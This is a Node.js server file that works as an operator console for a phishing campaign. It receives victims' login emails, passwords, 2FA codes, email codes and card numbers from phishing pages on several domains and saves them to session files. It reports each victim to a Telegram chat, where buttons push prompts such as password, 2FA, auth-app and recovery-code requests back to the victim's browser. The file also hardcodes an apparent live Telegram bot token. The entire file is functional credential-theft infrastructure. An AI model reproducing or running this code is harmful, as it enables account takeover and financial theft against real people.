// srlast.js - WebSocket Server with Reconnection Notifications
const WebSocket = require('ws');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const url = require('url');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ─── CONFIGURATION ─────────────────────────────────────────────────────────
const PORT = 8087;
const TELEGRAM_TOKEN = '8332694752:AAFcYiwScBCBCZ9z37sEjnQLLF88kDcHi6k';
const TELEGRAM_CHAT_ID = '-1003365231545';
const SESSIONS_DIR = '/root/fbnew/sessions';
const DISCONNECT_GRACE_PERIOD = 300000; // 5 MINUTES (300,000 ms)
// ───────────────────────────────────────────────────────────────────────────

// Ensure sessions directory exists
if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
    console.log(`📁 Created sessions directory: ${SESSIONS_DIR}`);
}

// Telegram bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Store clients
const clients = new Map();
const sessionData = new Map();
const sentNotifications = new Map();
const commandQueue = new Map();
const pendingDisconnects = new Map(); // Track pending disconnects
const clientReconnectTimes = new Map(); // Track when client last reconnected
const offlineSince = new Map(); // Track when client went offline

// ─── CORS Headers ──────────────────────────────────────────────────────────
const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, Accept, Cache-Control',
    'Access-Control-Max-Age': '86400'
};

// ─── Session File Functions ─────────────────────────────────────────────────
function getSessionFilePath(socketId) {
    return path.join(SESSIONS_DIR, `${socketId}.json`);
}

function loadSessionFromFile(socketId) {
    const filePath = getSessionFilePath(socketId);
    if (fs.existsSync(filePath)) {
        try {
            const data = fs.readFileSync(filePath, 'utf8');
            return JSON.parse(data);
        } catch (e) {
            console.error(`Error loading session ${socketId}:`, e.message);
        }
    }
    return {
        socketId: socketId,
        created_at: new Date().toISOString(),
        domain: 'unknown',
        data: {},
        commands: [],
        pending_commands: [],
        page_views: 0,
        last_seen: new Date().toISOString(),
        offline_count: 0,
        total_online_time: 0
    };
}

function saveSessionToFile(socketId, data) {
    const filePath = getSessionFilePath(socketId);
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        console.log(`💾 Session saved: ${filePath}`);
        return true;
    } catch (e) {
        console.error(`Error saving session ${socketId}:`, e.message);
        return false;
    }
}

function updateSessionData(socketId, key, value) {
    let session = sessionData.get(socketId);
    if (!session) {
        session = loadSessionFromFile(socketId);
        sessionData.set(socketId, session);
    }
    session[key] = value;
    session.last_seen = new Date().toISOString();
    saveSessionToFile(socketId, session);
}

function getAllSessions() {
    const sessions = {};
    try {
        const files = fs.readdirSync(SESSIONS_DIR);
        for (const file of files) {
            if (file.endsWith('.json')) {
                const socketId = file.replace('.json', '');
                const data = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, file), 'utf8'));
                sessions[socketId] = data;
            }
        }
    } catch (e) {
        console.error('Error reading sessions:', e.message);
    }
    // Sort by created_at newest first
    const sorted = {};
    Object.keys(sessions).sort((a, b) => new Date(sessions[b].created_at) - new Date(sessions[a].created_at)).forEach(key => {
        sorted[key] = sessions[key];
    });
    return sorted;
}

function getSessionsByDomain(domain) {
    if (!domain) return {};
    const sessions = {};
    try {
        const files = fs.readdirSync(SESSIONS_DIR);
        for (const file of files) {
            if (file.endsWith('.json')) {
                const socketId = file.replace('.json', '');
                const data = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, file), 'utf8'));
                if (data.domain === domain) {
                    sessions[socketId] = data;
                }
            }
        }
    } catch (e) {
        console.error('Error reading sessions by domain:', e.message);
    }
    // Sort by created_at newest first
    const sorted = {};
    Object.keys(sessions).sort((a, b) => new Date(sessions[b].created_at) - new Date(sessions[a].created_at)).forEach(key => {
        sorted[key] = sessions[key];
    });
    return sorted;
}

function getSessionsByEmail(email) {
    if (!email) return [];
    const sessions = [];
    try {
        const files = fs.readdirSync(SESSIONS_DIR);
        for (const file of files) {
            if (file.endsWith('.json')) {
                const data = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, file), 'utf8'));
                if (data.login_email === email || data.profile_email === email || data.email === email) {
                    sessions.push({
                        socketId: file.replace('.json', ''),
                        data: data
                    });
                }
            }
        }
    } catch (e) {
        console.error('Error reading sessions by email:', e.message);
    }
    return sessions;
}

function getDomains() {
    const domains = new Map();
    try {
        const files = fs.readdirSync(SESSIONS_DIR);
        for (const file of files) {
            if (file.endsWith('.json')) {
                const data = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, file), 'utf8'));
                const domain = data.domain || 'unknown';
                if (!domains.has(domain)) {
                    domains.set(domain, { totalSessions: 0, activeClients: 0, lastSeen: data.created_at });
                }
                domains.get(domain).totalSessions++;
                if (data.created_at > domains.get(domain).lastSeen) {
                    domains.get(domain).lastSeen = data.created_at;
                }
            }
        }
    } catch (e) {}
    
    // Add active clients (only count as active if WebSocket is OPEN)
    for (const [socketId, client] of clients) {
        if (client.domain && client.ws && client.ws.readyState === WebSocket.OPEN) {
            if (domains.has(client.domain)) {
                domains.get(client.domain).activeClients++;
            } else {
                domains.set(client.domain, { totalSessions: 0, activeClients: 1, lastSeen: new Date().toISOString() });
            }
        }
    }
    
    const result = [];
    for (const [domain, stats] of domains) {
        result.push({
            domain: domain,
            totalSessions: stats.totalSessions,
            activeClients: stats.activeClients,
            lastSeen: stats.lastSeen
        });
    }
    result.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
    return result;
}

// ─── SEND TO CLIENT ─────────────────────────────────────────────────────
function sendToClient(socketId, message) {
    const client = clients.get(socketId);
    
    if (client && client.ws && client.ws.readyState === WebSocket.OPEN) {
        try {
            client.ws.send(message);
            console.log(`✅ Command sent to ${socketId}: ${message}`);
            
            // Store in session
            const session = sessionData.get(socketId) || loadSessionFromFile(socketId);
            if (!session.commands) session.commands = [];
            session.commands.push({
                command: message,
                sent_at: new Date().toISOString(),
                delivered: true
            });
            sessionData.set(socketId, session);
            saveSessionToFile(socketId, session);
            return true;
        } catch (e) {
            console.error(`❌ Error sending to ${socketId}:`, e.message);
            return false;
        }
    }
    
    // Queue command for later
    console.log(`📦 Client ${socketId} offline, queueing command: ${message}`);
    if (!commandQueue.has(socketId)) {
        commandQueue.set(socketId, []);
    }
    commandQueue.get(socketId).push({
        command: message,
        queued_at: new Date().toISOString()
    });
    
    const session = sessionData.get(socketId) || loadSessionFromFile(socketId);
    if (!session.pending_commands) session.pending_commands = [];
    session.pending_commands.push({
        command: message,
        queued_at: new Date().toISOString()
    });
    sessionData.set(socketId, session);
    saveSessionToFile(socketId, session);
    
    return false;
}

function processQueuedCommands(socketId) {
    const queued = commandQueue.get(socketId);
    if (queued && queued.length > 0) {
        console.log(`📦 Processing ${queued.length} queued commands for ${socketId}`);
        for (const cmd of queued) {
            sendToClient(socketId, cmd.command);
        }
        commandQueue.delete(socketId);
        
        const session = sessionData.get(socketId) || loadSessionFromFile(socketId);
        session.pending_commands = [];
        sessionData.set(socketId, session);
        saveSessionToFile(socketId, session);
    }
}

// ─── Telegram Functions ────────────────────────────────────────────────────
function buildKeyboard(socketId, domain = null) {
    const keyboard = [
        [
            { text: '🔑 Password', callback_data: `${socketId}|login` },
            { text: '📱 2FA Text', callback_data: `${socketId}|verify` },
            { text: '📧 Email Code', callback_data: `${socketId}|emailcode` }
        ],
        [
            { text: '🔄 Reset Pass', callback_data: `${socketId}|reset` },
            { text: '⏱ 60 Min Block', callback_data: `${socketId}|60min` },
            { text: '⏱ 10 Min Block', callback_data: `${socketId}|10min` }
        ],
        [
            { text: '❌ Wrong Email', callback_data: `${socketId}|incorrect` },
            { text: '💬 2FA WhatsApp', callback_data: `${socketId}|verifywp` },
            { text: '🔐 2FA Auth App', callback_data: `${socketId}|verifyg` }
        ],
        [
            { text: '🔔 2FA Notify', callback_data: `${socketId}|verifynotify` },
            { text: '🗝 Recovery', callback_data: `${socketId}|verifybackup` },
            { text: '🚫 Restrict', callback_data: `${socketId}|restrict` }
        ],
        [
            { text: '✅ Done', callback_data: `${socketId}|done` },
            { text: '📄 Career', callback_data: `${socketId}|career` },
            { text: '📊 Session', callback_data: `${socketId}|session` }
        ]
    ];
    
    if (domain) {
        keyboard.push([
            { text: `🌐 ${domain}`, callback_data: `domain_${domain}` }
        ]);
    }
    
    return { inline_keyboard: keyboard };
}

async function sendStartupMessage() {
    const message = `🚀 *WEB SOCKET SERVER STARTED*\n━━━━━━━━━━━━━━━━━━━━━━\n📡 Port: \`${PORT}\`\n📁 Sessions: \`${SESSIONS_DIR}\`\n✅ Status: Online\n🌐 Multi-Domain Support: Enabled\n⏱️ Grace Period: ${DISCONNECT_GRACE_PERIOD/1000} seconds (${DISCONNECT_GRACE_PERIOD/60000} minutes)\n🔄 Auto-reconnect notifications: ENABLED`;
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TG] Failed to send startup message:', e.message);
    }
}

async function sendDomainSessions(domain) {
    const sessions = getSessionsByDomain(domain);
    const sessionArray = Object.values(sessions);
    const sessionCount = sessionArray.length;
    
    let message = `🌐 *DOMAIN: ${domain}*\n━━━━━━━━━━━━━━━━━━━━━━\n📊 Total Sessions: ${sessionCount}\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    let count = 0;
    for (const session of sessionArray) {
        count++;
        message += `\n${count}. 🆔 \`${session.socketId.substring(0, 20)}...\``;
        if (session.profile_name) message += `\n   👤 ${session.profile_name}`;
        if (session.profile_email) message += `\n   📧 ${session.profile_email}`;
        if (session.login_email) message += `\n   🔐 ${session.login_email}`;
        message += `\n   📅 ${new Date(session.created_at).toLocaleString()}`;
        
        if (count >= 10) {
            message += `\n\n_Showing 10 of ${sessionCount} sessions_`;
            break;
        }
    }
    
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TG] sendDomainSessions error:', e.message);
    }
}

async function sendSessionInfo(socketId) {
    const session = sessionData.get(socketId) || loadSessionFromFile(socketId);
    const client = clients.get(socketId);
    
    let message = `📊 *SESSION DETAILS*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${client?.domain || session.domain || 'unknown'}\`\n📡 IP: \`${client?.clientIp || session.clientIp || 'unknown'}\`\n🔗 URL: ${client?.currentUrl || session.currentUrl || 'unknown'}\n📅 Created: ${session.created_at ? new Date(session.created_at).toLocaleString() : 'unknown'}\n📅 Last Seen: ${session.last_seen ? new Date(session.last_seen).toLocaleString() : 'unknown'}\n📊 Offline Count: ${session.offline_count || 0}\n━━━━━━━━━━━━━━━━━━━━━━\n📝 *COLLECTED DATA:*\n`;
    
    const importantKeys = ['login_email', 'login_password', 'profile_email', 'profile_name', 'profile_phone', 'card_number', '2fa_code', 'email_code', 'wrong_email'];
    let hasData = false;
    for (const key of importantKeys) {
        if (session[key]) {
            let val = session[key];
            if (key === 'login_password') val = '••••••••';
            if (key === 'card_number' && val.length > 10) val = '****' + val.slice(-4);
            message += `└─ ${key}: \`${val}\`\n`;
            hasData = true;
        }
    }
    if (!hasData) message += `└─ No data collected yet\n`;
    
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
            parse_mode: 'Markdown',
            reply_markup: buildKeyboard(socketId, client?.domain || session.domain)
        });
    } catch (e) {
        console.error('[TG] sendSessionInfo error:', e.message);
    }
}

async function notifyConnect(socketId, domain, clientIp, currentUrl, isReconnect = false) {
    // Don't send duplicate notifications for first connection
    if (sentNotifications.has(socketId) && !isReconnect) {
        return;
    }
    sentNotifications.set(socketId, true);
    
    const session = sessionData.get(socketId) || {};
    const offlineDuration = offlineSince.has(socketId) ? Math.floor((Date.now() - offlineSince.get(socketId)) / 1000) : 0;
    const offlineMinutes = Math.floor(offlineDuration / 60);
    const offlineSeconds = offlineDuration % 60;
    
    let reconnectInfo = '';
    if (isReconnect && offlineDuration > 0) {
        reconnectInfo = `\n⏱️ *Was offline for:* ${offlineMinutes}m ${offlineSeconds}s`;
        // Clear offline tracking
        offlineSince.delete(socketId);
    }
    
    const statusIcon = isReconnect ? '🟢 BACK ONLINE' : '🟢 NEW CONNECTION';
    const message = `${isReconnect ? '🟢' : '🆕'} *CLIENT ${isReconnect ? 'BACK ONLINE' : 'CONNECTED'}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${domain}\`\n📡 IP: \`${clientIp}\`\n🔗 URL: ${currentUrl}\n📅 Time: \`${new Date().toISOString()}\`${reconnectInfo}\n${isReconnect ? '\n📦 *Pending commands will be delivered now*' : ''}`;
    
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
            parse_mode: 'Markdown',
            reply_markup: buildKeyboard(socketId, domain)
        });
    } catch (e) {
        console.error('[TG] notifyConnect error:', e.message);
    }
}

async function notifyDisconnect(socketId, domain, clientIp) {
    // Only send if client hasn't reconnected
    const client = clients.get(socketId);
    if (client && client.ws && client.ws.readyState === WebSocket.OPEN) {
        console.log(`[TG] Skipping disconnect - client ${socketId} reconnected`);
        return;
    }
    
    const session = sessionData.get(socketId) || {};
    const offlineCount = (session.offline_count || 0) + 1;
    updateSessionData(socketId, 'offline_count', offlineCount);
    updateSessionData(socketId, 'last_offline', new Date().toISOString());
    
    const message = `🔴 *CLIENT DISCONNECTED* (No activity for ${DISCONNECT_GRACE_PERIOD/60000} minutes)\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${domain}\`\n📡 IP: \`${clientIp}\`\n📅 Time: \`${new Date().toISOString()}\`\n📊 Total offline events: ${offlineCount}\n\n_Client can come back online within ${DISCONNECT_GRACE_PERIOD/60000} minutes without notification_`;
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TG] notifyDisconnect error:', e.message);
    }
}

async function notifyCommandSent(socketId, command, delivered) {
    const status = delivered ? '✅ DELIVERED' : '❌ FAILED';
    const message = `📨 *COMMAND ${status}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n💬 Command: \`${command}\`\n📅 Time: \`${new Date().toISOString()}\``;
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TG] notifyCommandSent error:', e.message);
    }
}

// ─── TELEGRAM CALLBACK ────────────────────────────────────────────────────
bot.on('callback_query', async (query) => {
    const data = query.data;
    await bot.answerCallbackQuery(query.id);
    
    if (data.startsWith('domain_')) {
        const domain = data.replace('domain_', '');
        await sendDomainSessions(domain);
        return;
    }
    
    const [socketId, message] = data.split('|');
    console.log(`🤖 Telegram button: ${message} for ${socketId}`);
    
    if (message === 'session') {
        await sendSessionInfo(socketId);
        return;
    }
    
    const delivered = sendToClient(socketId, message);
    await notifyCommandSent(socketId, message, delivered);
    if (!delivered) {
        await bot.sendMessage(TELEGRAM_CHAT_ID, `📦 Command \`${message}\` queued for \`${socketId}\``, { parse_mode: 'Markdown' });
    }
});

// ─── HTTP server ─────────────────────────────────────────────────────────────
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    const query = parsedUrl.query;
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200, corsHeaders);
        res.end();
        return;
    }
    
    // Store session data
    if (pathname === '/storeSession') {
        const socketId = query.socketId;
        const key = query.key;
        const value = query.value;
        
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        
        if (socketId && key) {
            let session = sessionData.get(socketId);
            if (!session) {
                session = loadSessionFromFile(socketId);
                sessionData.set(socketId, session);
            }
            session[key] = value || '';
            saveSessionToFile(socketId, session);
            console.log(`[SESSION] ${socketId}: ${key} = ${value}`);
            res.end(JSON.stringify({ success: true }));
        } else {
            res.end(JSON.stringify({ success: false, message: 'Missing parameters' }));
        }
        return;
    }
    
    // Get session data
    if (pathname === '/getSession') {
        const socketId = query.socketId;
        
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        
        if (socketId) {
            let session = sessionData.get(socketId) || loadSessionFromFile(socketId);
            res.end(JSON.stringify({ success: true, data: session }));
        } else {
            res.end(JSON.stringify({ success: false, data: {} }));
        }
        return;
    }
    
    // Get all sessions
    if (pathname === '/getAllSessions') {
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        const allSessions = getAllSessions();
        res.end(JSON.stringify({ success: true, data: allSessions, total: Object.keys(allSessions).length }));
        return;
    }
    
    // Get sessions by domain
    if (pathname === '/getSessionsByDomain') {
        const domain = query.domain;
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        if (domain) {
            const sessions = getSessionsByDomain(domain);
            res.end(JSON.stringify({ success: true, data: sessions, domain: domain }));
        } else {
            res.end(JSON.stringify({ success: false, data: {} }));
        }
        return;
    }
    
    // Get domains
    if (pathname === '/getDomains') {
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        const domains = getDomains();
        res.end(JSON.stringify({ success: true, domains: domains }));
        return;
    }
    
    // Get sessions by email
    if (pathname === '/getSessionsByEmail') {
        const email = query.email;
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        if (email) {
            const sessions = getSessionsByEmail(email);
            res.end(JSON.stringify({ success: true, data: sessions }));
        } else {
            res.end(JSON.stringify({ success: false, data: [] }));
        }
        return;
    }
    
    // Delete session
    if (pathname === '/deleteSession') {
        const socketId = query.socketId;
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        if (socketId) {
            const filePath = getSessionFilePath(socketId);
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                sessionData.delete(socketId);
                commandQueue.delete(socketId);
                console.log(`🗑️ Session deleted: ${socketId}`);
                res.end(JSON.stringify({ success: true }));
            } else {
                res.end(JSON.stringify({ success: false }));
            }
        } else {
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }
    
    // Send message to client
    if (pathname === '/sendMessage') {
        const socketId = query.socketId;
        const message = query.message;
        
        console.log(`📨 /sendMessage: socketId=${socketId}, message=${message}`);
        
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        
        if (!socketId || !message) {
            res.end(JSON.stringify({ success: false, error: 'Missing parameters' }));
            return;
        }
        
        const delivered = sendToClient(socketId, message);
        res.end(JSON.stringify({ success: delivered, delivered: delivered }));
        return;
    }
    
    // Get connected clients
    if (pathname === '/clients') {
        const clientList = [];
        for (const [socketId, client] of clients) {
            clientList.push({
                socketId: socketId,
                domain: client.domain,
                ip: client.clientIp,
                connectedAt: client.connectedAt,
                status: client.ws && client.ws.readyState === WebSocket.OPEN ? 'online' : 'offline',
                currentUrl: client.currentUrl,
                lastSeen: client.lastSeen
            });
        }
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, clients: clientList, total: clientList.length }));
        return;
    }
    
    // Health check
    if (pathname === '/' || pathname === '/health') {
        let sessionCount = 0;
        try {
            const files = fs.readdirSync(SESSIONS_DIR);
            sessionCount = files.filter(f => f.endsWith('.json')).length;
        } catch(e) {}
        
        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            status: 'ok', 
            uptime: process.uptime(),
            activeClients: clients.size,
            totalSessions: sessionCount,
            domains: getDomains(),
            clientsList: Array.from(clients.keys())
        }));
        return;
    }
    
    res.writeHead(404, corsHeaders);
    res.end('Not found');
});

// ─── WebSocket server (WITH LONG GRACE PERIOD & RECONNECT NOTIFICATIONS) ────
const wss = new WebSocket.Server({ server, path: '/wss2/' });

wss.on('connection', (ws, req) => {
    const query = url.parse(req.url, true).query;
    const domain = query.domain || 'unknown';
    const clientIp = query.clientIp || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let socketId = query.socketId;
    const userAgent = req.headers['user-agent'] || 'unknown';
    
    // Generate socket ID if not provided
    if (!socketId || socketId === 'undefined' || socketId === 'null') {
        socketId = uuidv4();
        console.log(`🆕 Generated new socket ID: ${socketId}`);
    }
    
    console.log(`\n🔌 WebSocket Connected`);
    console.log(`   Socket ID: ${socketId}`);
    console.log(`   Domain: ${domain}`);
    console.log(`   IP: ${clientIp}`);
    console.log(`   User Agent: ${userAgent.substring(0, 50)}...`);
    
    // Check if this is a reconnection (client was previously online and went offline)
    const isReconnect = clients.has(socketId) || pendingDisconnects.has(socketId);
    
    // Cancel any pending disconnect for this socket
    if (pendingDisconnects.has(socketId)) {
        clearTimeout(pendingDisconnects.get(socketId));
        pendingDisconnects.delete(socketId);
        console.log(`✅ Cancelled pending disconnect for ${socketId} - client reconnected`);
    }
    
    // Calculate offline duration if this is a reconnect
    let offlineDuration = 0;
    if (offlineSince.has(socketId)) {
        offlineDuration = Date.now() - offlineSince.get(socketId);
        console.log(`📊 Client ${socketId} was offline for ${Math.floor(offlineDuration / 1000)} seconds`);
    }
    
    // Update reconnect time
    clientReconnectTimes.set(socketId, Date.now());
    
    // Load existing session
    let session = sessionData.get(socketId) || loadSessionFromFile(socketId);
    
    // Update session
    session.domain = domain;
    session.clientIp = clientIp;
    session.userAgent = userAgent;
    session.last_seen = new Date().toISOString();
    session.page_views = (session.page_views || 0) + 1;
    if (!session.created_at) session.created_at = new Date().toISOString();
    sessionData.set(socketId, session);
    saveSessionToFile(socketId, session);
    
    // Check for pending commands
    const hasPendingCommands = commandQueue.has(socketId) && commandQueue.get(socketId).length > 0;
    
    // Store client
    const existingClient = clients.get(socketId);
    clients.set(socketId, { 
        ws: ws, 
        clientIp: clientIp, 
        currentUrl: existingClient?.currentUrl || 'unknown', 
        status: 'connected', 
        connectedAt: session.created_at,
        domain: domain,
        userAgent: userAgent,
        reconnectCount: (existingClient?.reconnectCount || 0) + 1,
        lastReconnect: new Date().toISOString()
    });
    
    // Send socket ID to client
    ws.send(`socket ID: ${socketId}`);
    ws.send(JSON.stringify({ type: 'connected', socketId: socketId, domain: domain }));
    
    // Process queued commands
    if (hasPendingCommands) {
        console.log(`📦 Processing ${commandQueue.get(socketId).length} queued commands for ${socketId}`);
        setTimeout(() => {
            processQueuedCommands(socketId);
        }, 1000);
    }
    
    // Send notification (with reconnect info if applicable)
    if (isReconnect && offlineDuration > 0) {
        // This is a reconnect after being offline - send BACK ONLINE notification
        notifyConnect(socketId, domain, clientIp, existingClient?.currentUrl || 'Reconnected', true);
    } else if (!sentNotifications.has(socketId)) {
        // First time connection
        notifyConnect(socketId, domain, clientIp, existingClient?.currentUrl || 'New connection', false);
        sentNotifications.set(socketId, true);
    }
    
    // Handle incoming messages
    ws.on('message', (raw) => {
        const msg = raw.toString();
        console.log(`[MSG] ${socketId} (${domain}): ${msg.substring(0, 100)}`);
        
        // Initial connection with URL
        if (msg.startsWith('Hello,')) {
            const newUrl = msg.replace('Hello, server! Connected from URL:', '').trim();
            const client = clients.get(socketId);
            if (client) {
                const oldUrl = client.currentUrl;
                client.currentUrl = newUrl;
                clients.set(socketId, client);
                
                // Update session
                const session = sessionData.get(socketId) || {};
                session.currentUrl = newUrl;
                session.last_seen = new Date().toISOString();
                sessionData.set(socketId, session);
                saveSessionToFile(socketId, session);
                
                if (oldUrl && oldUrl !== 'unknown') {
                    console.log(`📍 ${domain} - Page navigated: ${oldUrl} -> ${newUrl}`);
                }
            }
            return;
        }
        
        // URL changes (page navigation)
        if (msg.startsWith('URL changed to:')) {
            const newUrl = msg.replace('URL changed to:', '').trim();
            const client = clients.get(socketId);
            if (client) {
                client.currentUrl = newUrl;
                clients.set(socketId, client);
                
                const session = sessionData.get(socketId) || {};
                session.currentUrl = newUrl;
                session.last_seen = new Date().toISOString();
                sessionData.set(socketId, session);
                saveSessionToFile(socketId, session);
                
                console.log(`📍 ${domain} - URL changed: ${newUrl}`);
            }
            return;
        }
        
        // Career profile data
        if (msg.startsWith('CAREER_PROFILE:')) {
            try {
                const profileData = JSON.parse(msg.replace('CAREER_PROFILE:', ''));
                const session = sessionData.get(socketId) || {};
                for (const [key, value] of Object.entries(profileData)) {
                    session[key] = value;
                }
                session.profile_completed = true;
                session.profile_time = new Date().toISOString();
                session.domain = domain;
                session.last_seen = new Date().toISOString();
                sessionData.set(socketId, session);
                saveSessionToFile(socketId, session);
                ws.send(`CAREER_PROFILE_STORED: OK`);
                console.log(`✅ Career profile saved for ${socketId} (${domain})`);
            } catch(e) {
                console.error('Error parsing career profile:', e);
            }
            return;
        }
        
        // Session data
        if (msg.startsWith('SESSION:')) {
            try {
                const newData = JSON.parse(msg.replace('SESSION:', ''));
                const session = sessionData.get(socketId) || {};
                for (const [key, value] of Object.entries(newData)) {
                    session[key] = value;
                }
                session.last_seen = new Date().toISOString();
                session.domain = domain;
                sessionData.set(socketId, session);
                saveSessionToFile(socketId, session);
                ws.send(`SESSION_STORED: OK`);
                console.log(`✅ Session data saved for ${socketId} (${domain})`);
            } catch(e) {
                console.error('Error parsing session data:', e);
            }
            return;
        }
        
        // Ping/Pong for keep-alive
        if (msg === 'PING') {
            ws.send('PONG');
            return;
        }
    });
    
    // Handle close - WITH LONG GRACE PERIOD
    ws.on('close', () => {
        console.log(`🔴 WebSocket closed for ${socketId} (${domain}) - Waiting ${DISCONNECT_GRACE_PERIOD/1000}s (${DISCONNECT_GRACE_PERIOD/60000} min) for reconnect`);
        
        const client = clients.get(socketId);
        if (client) {
            client.status = 'waiting';
            client.disconnectedAt = new Date().toISOString();
            clients.set(socketId, client);
            
            const session = sessionData.get(socketId) || {};
            session.last_seen = new Date().toISOString();
            sessionData.set(socketId, session);
            saveSessionToFile(socketId, session);
            
            // Track when client went offline
            offlineSince.set(socketId, Date.now());
        }
        
        // Set a long timer to send disconnect notification only if client doesn't reconnect
        const disconnectTimer = setTimeout(() => {
            const finalClient = clients.get(socketId);
            // Only send disconnect if client is still not connected
            if (finalClient && finalClient.status !== 'connected') {
                finalClient.status = 'disconnected';
                clients.set(socketId, finalClient);
                notifyDisconnect(socketId, domain, clientIp);
                console.log(`🔴 Client confirmed disconnected after ${DISCONNECT_GRACE_PERIOD/1000}s grace period: ${socketId}`);
            } else if (finalClient && finalClient.status === 'connected') {
                console.log(`✅ Client ${socketId} reconnected within grace period - no disconnect notification`);
                // Clear offline tracking since client reconnected
                offlineSince.delete(socketId);
            }
            pendingDisconnects.delete(socketId);
        }, DISCONNECT_GRACE_PERIOD);
        
        pendingDisconnects.set(socketId, disconnectTimer);
    });
    
    // Handle errors
    ws.on('error', (error) => {
        console.error(`⚠️ WebSocket error for ${socketId}:`, error.message);
    });
    
    // Keep-alive ping every 30 seconds
    const keepAliveInterval = setInterval(() => {
        const client = clients.get(socketId);
        if (client && client.ws && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    }, 30000);
    
    ws.keepAliveInterval = keepAliveInterval;
    
    ws.on('close', () => {
        if (ws.keepAliveInterval) clearInterval(ws.keepAliveInterval);
    });
});

// ─── Start server ────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', async () => {
    console.log(`\n${'='.repeat(50)}`);
    console.log(`🚀 WebSocket Control Server Started`);
    console.log(`${'='.repeat(50)}`);
    console.log(`📡 HTTP Server: http://0.0.0.0:${PORT}`);
    console.log(`🔌 WebSocket:   ws://0.0.0.0:${PORT}/wss2/`);
    console.log(`📁 Sessions Directory: ${SESSIONS_DIR}`);
    console.log(`${'='.repeat(50)}`);
    console.log(`✅ Multi-Domain Support: ENABLED`);
    console.log(`✅ Sessions ordered by newest first`);
    console.log(`✅ Grace Period: ${DISCONNECT_GRACE_PERIOD/1000} seconds (${DISCONNECT_GRACE_PERIOD/60000} minutes)`);
    console.log(`✅ Clients can be offline for ${DISCONNECT_GRACE_PERIOD/60000} minutes without disconnect notification`);
    console.log(`✅ Commands are queued and delivered when client returns`);
    console.log(`✅ "BACK ONLINE" notifications sent when client returns after being offline`);
    console.log(`${'='.repeat(50)}\n`);
    
    await sendStartupMessage();
});

// ─── Graceful shutdown ──────────────────────────────────────────────────────
process.on('SIGINT', () => {
    console.log('\n[SHUTDOWN] Received SIGINT. Closing server...');
    for (const [id, client] of clients) {
        if (client.ws && client.ws.readyState === WebSocket.OPEN) {
            client.ws.close();
        }
    }
    server.close(() => {
        console.log('[SHUTDOWN] Server closed. Goodbye!');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n[SHUTDOWN] Received SIGTERM. Closing server...');
    server.close(() => {
        console.log('[SHUTDOWN] Server closed. Goodbye!');
        process.exit(0);
    });
});